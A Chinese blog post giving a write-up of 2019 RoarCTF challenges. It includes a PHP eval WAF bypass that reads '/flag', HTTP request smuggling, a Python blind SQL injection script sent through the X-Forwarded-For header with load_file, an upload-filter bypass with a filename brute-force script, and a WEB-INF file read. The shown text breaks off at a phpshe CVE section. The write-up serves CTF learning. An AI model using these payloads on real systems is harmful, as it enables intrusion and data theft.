<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="Roarctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 RoarCTF部分题解WriteUp | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到"><span class="toc-number">1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黄金6年"><span class="toc-number">1.2.</span> <span class="toc-text">黄金6年</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-calc"><span class="toc-number">2.1.</span> <span class="toc-text">easy_calc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#解法1"><span class="toc-number">2.1.1.</span> <span class="toc-text">解法1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解法2"><span class="toc-number">2.1.2.</span> <span class="toc-text">解法2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#online-proxy"><span class="toc-number">2.2.</span> <span class="toc-text">online_proxy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-upload"><span class="toc-number">2.3.</span> <span class="toc-text">simple_upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-java"><span class="toc-number">2.4.</span> <span class="toc-text">easy_java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpshe"><span class="toc-number">2.5.</span> <span class="toc-text">phpshe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#前台注入"><span class="toc-number">2.5.1.</span> <span class="toc-text">前台注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#后台getshell"><span class="toc-number">2.5.2.</span> <span class="toc-text">后台getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA"><span class="toc-number">3.1.</span> <span class="toc-text">RSA</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">101</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">49</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a><a class="author-info-links__name text-center" href="https://www.virtua1.cn/" target="_blank" rel="noopener">Virtua1</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 RoarCTF部分题解WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>2019 RoarCTF部分题解</p>
<p>完整官方题解及源码：<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code" target="_blank" rel="noopener">https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code</a> </p>
<p>复现环境：<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn</a> </p>
<p>题解部分为复现</p>
<a id="more"></a>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>RoarCTF{WM-F8oD0cdeUXdHrIUF} </p>
<h3 id="黄金6年"><a href="#黄金6年" class="headerlink" title="黄金6年"></a>黄金6年</h3><p><strong>ffmpeg</strong>分离mp4文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i 1.mp4 -r 60 -f image2 j-%05d.bmp</span><br></pre></td></tr></table></figure>

<p>从分离出来的600多张图中找到四个二维码，分别在四本书上：</p>
<p>（1）c++  ： <code>key1:i</code></p>
<p>（2）白帽子讲Web安全：<code>key2:want</code> </p>
<p>（3）逆向工程：<code>key3:play</code></p>
<p>（4）活着：<code>key4:ctf</code></p>
<p>得到四个key</p>
<p>然后winhex打开mp4文件，末尾发现有一串base64加密字符串</p>
<p><img src="../../../../img/roarctf/13.png" alt=""></p>
<p>解密后得到：</p>
<p><img src="../../../../img/roarctf/14.png" alt=""></p>
<p>头部信息看出是<strong>rar</strong>压缩包，保存成rar后</p>
<p>打开flag.txt，解压密码就是四个二维码扫出的四个key拼接后的字符串：<code>iwantplayctf</code></p>
<p>flag：roarctf{CTF-from-RuMen-to-RuYuan}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>除了源码里的waf过滤了，还有中间代理服务器的waf，主要过滤了所有的英文字母和不可见字母，空格，+等</p>
<h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>参考：<a href="https://xz.aliyun.com/t/5621" target="_blank" rel="noopener">https://xz.aliyun.com/t/5621</a> </p>
<p>因为全局的waf是针对参数<strong>num</strong>，如果参入的参数为<strong>%20num</strong>，就能绕过全局waf，并且PHP接受该参数时会自动删除最前面的空格<strong>%20</strong></p>
<p>那么剩下的，就只有php后端的waf了，主要就是过滤了<strong>单引号</strong>和<strong>双引号</strong>，如果函数传参，用chr函数得出字符即可</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%20num=phpinfo()</span><br><span class="line">calc.php?%20num=var_dump(scandir(chr(47)))</span><br><span class="line">calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>

<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>HTTP走私，参考：<a href="https://paper.seebug.org/1048/?tdsourcetag=s_pcqq_aiomsg#32-cl-cl" target="_blank" rel="noopener">https://paper.seebug.org/1048/?tdsourcetag=s_pcqq_aiomsg#32-cl-cl</a> </p>
<p>数据包中头部构造两个<strong>Content-Length</strong>，导致中继服务器400错误，绕过waf，php后端则成功接收<strong>num</strong>参数</p>
<p><img src="../../../../img/roarctf/41.png" alt=""></p>
<h3 id="online-proxy"><a href="#online-proxy" class="headerlink" title="online_proxy"></a>online_proxy</h3><p>打开靶机，是一个代理页面</p>
<p><img src="../../../../img/roarctf/7.png" alt=""></p>
<p>提示我们可以输入参数url访问外网，第一感觉是ssrf，于是先访问自己vps </p>
<p><img src="../../../../img/roarctf/6.png" alt=""></p>
<p>从访问包可以看出，后台执行的是<strong>file_get_contents</strong>函数，又尝试了<strong>file://</strong>，<strong>data://</strong>，<strong>php://input</strong></p>
<p>发现全被过滤了，只允许http和https协议，故ssrf思路中断</p>
<p>查看源代码，发现一行注释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.18316912651062 s </span><br><span class="line"> Current Ip: 202.101.138.81  --&gt;</span><br></pre></td></tr></table></figure>

<p>既然跟ip有关，那么加个ip头部试试</p>
<p><img src="../../../../img/roarctf/8.png" alt=""></p>
<p>发现<strong>Current Ip</strong>字段被修改成了127.0.0.1，并且出现了<strong>Last Ip</strong>字段</p>
<p>既然有弹出<strong>Last Ip</strong>字段，那么就可能有数据库之间的交互，那么，尝试一下是否存在注入</p>
<p>这里也是测试了很久，一直搞不清后台的逻辑，最后是模糊的测试出这样的注入逻辑：</p>
<p>第一次访问，插入注入的payload：<code>X-Forwarded-For:1&#39;/**/and/**/ascii(substr(&#39;abc&#39;,1,1))=97/**/and/**/&#39;1</code></p>
<p><img src="../../../../img/roarctf/9.png" alt=""></p>
<p>第二次访问，插入一个跟第一次不一样的payload：<code>X-Forwarded-For:1&#39;/**/and/**/ascii(substr(&#39;abc&#39;,1,1))=96/**/and/**/&#39;1</code></p>
<p><img src="../../../../img/roarctf/10.png" alt=""></p>
<p>第三次访问，以第二次访问的payload：</p>
<p><img src="../../../../img/roarctf/11.png" alt=""></p>
<p>发现，在<strong>Last Ip</strong>字段，显示出了第一次访问插入的payload执行结果：1</p>
<p>根据这个逻辑，写出<strong>二次注入</strong>的盲注exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://pyvditfrroarctf.4hou.com.cn:32523/"</span></span><br><span class="line">database = <span class="string">"ctf"</span></span><br><span class="line">table_name = <span class="string">"ip_log"</span></span><br><span class="line">column_name = <span class="string">"uuid,current_ip,last_ip"</span></span><br><span class="line">user = <span class="string">"root@localhost"</span></span><br><span class="line">flag = <span class="string">"526F61724354467B776D2D666138613832343032363034383833327D"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        <span class="comment">#payload = "1'/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='ip_log'),%d,1))=%d/**/and/**/'1"%(i,j)</span></span><br><span class="line">        payload = <span class="string">"1'/**/and/**/ascii(substr((select/**/hex(load_file('/flag'))),%d,1))=%d/**/and/**/'1"</span>%(i,j)</span><br><span class="line">        header = &#123;<span class="string">"X-Forwarded-For"</span>:payload&#125;</span><br><span class="line">        r1 = s.get(url,headers=header)</span><br><span class="line">        payload = <span class="string">"1'/**/and/**/ascii(substr((select/**/hex(load_file('/flag'))),%d,1))=%d/**/and/**/'1"</span>%(i,j+<span class="number">1</span>)</span><br><span class="line">        header = &#123;<span class="string">"X-Forwarded-For"</span>: payload&#125;</span><br><span class="line">        r2 = s.get(url,headers=header)</span><br><span class="line">        r3 = s.get(url,headers=header)</span><br><span class="line">        last_ip = re.findall(<span class="string">'Last Ip: (\d)+'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> str(last_ip) == <span class="string">"1"</span>:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>注出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">库：ctf</span><br><span class="line"></span><br><span class="line">表：ip_log</span><br><span class="line"></span><br><span class="line">列：uuid,current_ip,last_ip</span><br></pre></td></tr></table></figure>

<p>但是似乎没有flag或者什么提示信息，于是想到最近刷的二次注入题，多半都是要利用<strong>load_file</strong>来读文件，于是，先注了一下<strong>user()</strong>，发现是<strong>root@localhost</strong>，那么执行<strong>load_file</strong>，这里更是碰运气了，直接去读了<strong>/flag</strong>，没想到还真给读出来了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：526F61724354467B776D2D666138613832343032363034383833327D</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/roarctf/12.png" alt=""></p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><p><img src="../../../../img/roarctf/17.png" alt=""></p>
<p>上传题，基于<strong>tp3.2.6</strong>框架，自写了<strong>index</strong>和<strong>upload</strong>方法</p>
<p>实际上过滤就只有一处：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>过滤了后缀名为php，我们注意到这里过滤的函数是<strong>strstr</strong>，并且判断条件为真才过滤，所以是可以确定用<strong>数组绕过</strong>的，先随便上传一个php以外的文件：</p>
<p><img src="../../../../img/roarctf/18.png" alt=""></p>
<p>成功返回了路径，但是访问会发现，phtml文件里的php代码是无法被正常解析的，所以题目的意思就是只能想办法上传php文件</p>
<p>再用数组绕过对php后缀的过滤：</p>
<p><img src="../../../../img/roarctf/19.png" alt=""></p>
<p>返回的信息来看，似乎是上传成功，但是不知道为什么没有返回路径</p>
<p>这时候就要来找tp对应的<strong>Upload</strong>类，路径：<strong>ThinkPHP/Library/Think/Upload.class.php</strong></p>
<p>因为整个源码中，只实例化了这个类，所以我们只需要关注<strong>$upload-&gt;upload()</strong>即可</p>
<p>审计后发现，当我们上传一个<strong>文件数组</strong>时，特别调用了一个对上传文件数组信息处理的方法：<strong>dealFiles</strong><img src="../../../../img/roarctf/31.png" alt=""></p>
<p>跟进这个方法</p>
<p><img src="../../../../img/roarctf/20.png" alt=""></p>
<p>这个方法逻辑简单来说就是把上传的文件数组每个逐一赋值给<strong>$fileArray[$n]</strong></p>
<p>本地测试一下，上传一个文件数组，打印<strong>$files</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;file&quot;]=&gt;</span><br><span class="line">  array(5) &#123;</span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      string(8) &quot;5cmd.php&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;type&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      string(24) &quot;application/octet-stream&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;tmp_name&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      string(14) &quot;/tmp/phpCHQfKR&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;error&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      int(0)</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;size&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      int(20)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后经过<strong>dealFiles</strong>函数处理后的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(6) &#123;</span><br><span class="line">    [&quot;key&quot;]=&gt;</span><br><span class="line">    string(4) &quot;file&quot;</span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(8) &quot;5cmd.php&quot;</span><br><span class="line">    [&quot;type&quot;]=&gt;</span><br><span class="line">    string(24) &quot;application/octet-stream&quot;</span><br><span class="line">    [&quot;tmp_name&quot;]=&gt;</span><br><span class="line">    string(14) &quot;/tmp/phpCHQfKR&quot;</span><br><span class="line">    [&quot;error&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;size&quot;]=&gt;</span><br><span class="line">    int(20)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后上传成功文件数组，返回的是一个<strong>$info[0]</strong>：</p>
<p><img src="../../../../img/roarctf/21.png" alt=""></p>
<p>而如果上传成功一个文件，index最后回显结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info[&apos;file&apos;][&apos;savepath&apos;].$info[&apos;file&apos;][&apos;savename&apos;]</span><br></pre></td></tr></table></figure>

<p>所以，自然就不会回显出上传后的路径</p>
<p>既然没有回显，就看看文件名是如何生成的：</p>
<p><img src="../../../../img/roarctf/22.png" alt=""></p>
<p>跟进<strong>getSaveName</strong>：<br><img src="../../../../img/roarctf/26.png" alt=""></p>
<p><img src="../../../../img/roarctf/24.png" alt=""></p>
<p>这里引进了<strong>$this-&gt;saveName</strong>参数，由于实例化Upload类时并没有改变该参数的值，所以为默认的<code>array(&#39;uniqid&#39;, &#39;&#39;)</code></p>
<p>这个变量对应的其实是一个文件命名的规则，由于不为空，所以<strong>getSaveName</strong>继续执行<strong>getName</strong>方法</p>
<p><img src="../../../../img/roarctf/27.png" alt=""></p>
<p>即文件名是通过<strong>uniqid</strong>方法产生，然后后缀名为正常上传文件的<strong>php</strong></p>
<p>看一下官方文档对<strong>uniqid</strong>函数的说明</p>
<p><img src="../../../../img/roarctf/28.png" alt=""></p>
<p>即生成一个基于当前时间的唯一ID，经过观察，发现这个ID每个字符都以0123456789abcdef<strong>递增</strong>的顺序进行变化</p>
<p>于是想到<strong>爆破</strong>的方法，思路是先上传个非php文件，得到一个时间ID，再上传一个php文件，最后再传一个非php文件，得到第二个时间ID，那么上传的php文件时间ID就在这两个范围之间，我们就可以进行爆破</p>
<p>这里通过写脚本进行上传，这样能尽量缩小爆破的范围，上传的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ae52db60-2499-44ae-98af-1c4224089e10.node2.buuoj.cn.wetolink.com:82/index.php?m=home&amp;c=index&amp;a=upload"</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">"file"</span>:open(<span class="string">"D:/file_upload_demo/3cmd.phtml"</span>,<span class="string">"r"</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1 = requests.post(url,files=files)</span><br><span class="line">print(r1.text)</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">"file[]"</span>:open(<span class="string">"D:/file_upload_demo/5cmd.php"</span>,<span class="string">"r"</span>)</span><br><span class="line">&#125;</span><br><span class="line">r2 = requests.post(url,files=files)</span><br><span class="line">print(r2.text)</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">"file"</span>:open(<span class="string">"D:/file_upload_demo/3cmd.phtml"</span>,<span class="string">"r"</span>)</span><br><span class="line">&#125;</span><br><span class="line">r3 = requests.post(url,files=files)</span><br><span class="line">print(r3.text)</span><br></pre></td></tr></table></figure>

<p>执行的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2019-10-15\/5da4b6ca60a00.phtml&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2019-10-15\/5da4b6ca9cd49.phtml&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，php文件名的范围是<strong>5da4b6ca60a00</strong>~<strong>5da4b6ca9cd49</strong>之间，即爆破五位数<strong>60a00</strong>-<strong>9cd49</strong></p>
<p>爆破exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="string">"0123456789abcdef"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">                    filename = <span class="string">"5da4b6ca"</span> + hex(i)[<span class="number">2</span>:] + hex(j)[<span class="number">2</span>:] + hex(k)[<span class="number">2</span>:] + hex(l)[<span class="number">2</span>:] + hex(m)[<span class="number">2</span>:]</span><br><span class="line">                    url = <span class="string">"http://ae52db60-2499-44ae-98af-1c4224089e10.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/%s.php"</span>%filename</span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    print(str(r.status_code) + <span class="string">":"</span> + filename)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        print(<span class="string">"------------------------------------------right_filename:"</span>+filename)</span><br></pre></td></tr></table></figure>

<p>因为脚本上传的间隔是近似相等的，所以就先从中间的<strong>80000</strong>开始爆，爆了大约十五分钟，文件名就爆出来了：<strong>5da4b6ca80e7e</strong></p>
<p><img src="../../../../img/roarctf/29.png" alt=""></p>
<p>访问5da4b6ca80e7e.php，得到flag：</p>
<p><img src="../../../../img/roarctf/30.png" alt=""></p>
<h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>源码中有个读取文件的功能：<strong>/Download?filename=help.docx</strong></p>
<p><img src="../../../../img/roarctf/35.png" alt=""></p>
<p>但是读取失败，尝试修改为POST方法，读取成功</p>
<p><img src="../../../../img/roarctf/36.png" alt=""></p>
<p>tomcat web目录：</p>
<p><img src="../../../../img/roarctf/37.png" alt=""></p>
<p>尝试读取<strong>WEB-INF/web.xml</strong></p>
<p><img src="../../../../img/roarctf/38.png" alt=""></p>
<p>发现flag文件的路径<strong>WEB-INF/classes/com/wm/ctf/FlagController.class</strong></p>
<p><img src="../../../../img/roarctf/39.png" alt=""></p>
<p>将图像文件base64解码得到flag</p>
<p><img src="../../../../img/roarctf/40.png" alt=""></p>
<h3 id="phpshe"><a href="#phpshe" class="headerlink" title="phpshe"></a>phpshe</h3><h4 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h4><p>根据CVE-2019-9762 ：<a href="https://anquan.baidu.com/article/697" target="_blank" rel="noopener">https://anquan.baidu.com/article/697</a> </p>
<p>前台路径：/include/plugin/payment/alipay/pay.php存在sql注入，并且有回显</p>
<p>漏洞触发点：</p>
<p><img src="../../../../img/roarctf/44.png" alt=""></p>
